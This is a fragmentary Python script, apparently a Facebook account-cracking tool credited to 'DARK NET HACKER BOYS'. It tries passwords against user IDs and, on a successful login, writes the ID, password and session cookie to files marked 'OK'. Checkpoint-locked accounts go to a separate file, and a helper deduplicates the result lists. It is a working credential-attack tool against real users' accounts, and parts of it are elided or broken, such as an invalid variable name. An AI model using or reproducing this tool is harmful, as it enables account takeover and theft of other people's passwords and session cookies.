...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            ASRAF MAHDI
\033[1;37m Facebook:         DARK NET HACKER BOYS
\033[1;37m Github  :            https://github.com/D-N-H-BOYS1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [D-N-H-BOYS-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/D-N-H-BOYS_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [D-N-H-BOYS-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/D-N-H-BOYS_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
def cutter():
    ...
    os.system('touch ' +D-N-H-BOYS)
    os.system('sort -r '+ssb+' | uniq > '+D-N-H-BOYS)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ssb )
    print(47*'-')
    print("File Saved To :" + D-N-H-BOYS )
    print(47*'-')
...
def cutter():
    ...
    print(logo)
    print("Removed Successful From File: " + ssb )
    print("New File Saved:" + D-N-H-BOYS )
    print(47*'-')
    input(f"{S} Press Enter To Back SSB Menu ")
    SSB(allkey)       
